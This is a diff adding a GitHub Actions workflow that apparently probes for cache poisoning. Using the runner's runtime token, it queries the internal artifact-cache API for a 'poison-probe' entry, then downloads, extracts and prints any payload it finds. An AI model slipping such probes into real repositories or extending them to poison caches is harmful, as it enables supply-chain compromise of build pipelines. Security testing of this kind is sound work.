@@ -1,0 +1,28 @@
+name: trusted-restore
+on:
+  push:
+    branches: [main]
+jobs:
+  restore:
+    runs-on: ubuntu-latest
+    steps:
+      - name: raw api restore poison-probe
+        run: |
+          set -e
+          BASE="${ACTIONS_RESULTS_URL:-$ACTIONS_CACHE_URL}"
+          API="${BASE}_apis/artifactcache"
+          KEY="poison-probe"
+          VER="probe-v1"
+          R=$(curl -s -w '\n%{http_code}' "$API/cache?keys=$KEY&version=$VER" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1")
+          echo "GET_CODE=$(echo "$R" | tail -1)"
+          echo "GET_BODY=$(echo "$R" | head -1)"
+          LOC=$(echo "$R" | head -1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('archiveLocation',''))" 2>/dev/null || true)
+          echo "LOC=$LOC"
+          if [ -n "$LOC" ]; then
+            curl -s -L "$LOC" -o /tmp/restored.tgz
+            mkdir -p out && tar -xzf /tmp/restored.tgz -C out
+            echo "=== RESTORED PAYLOAD ==="
+            cat out/payload.txt || true
+          fi
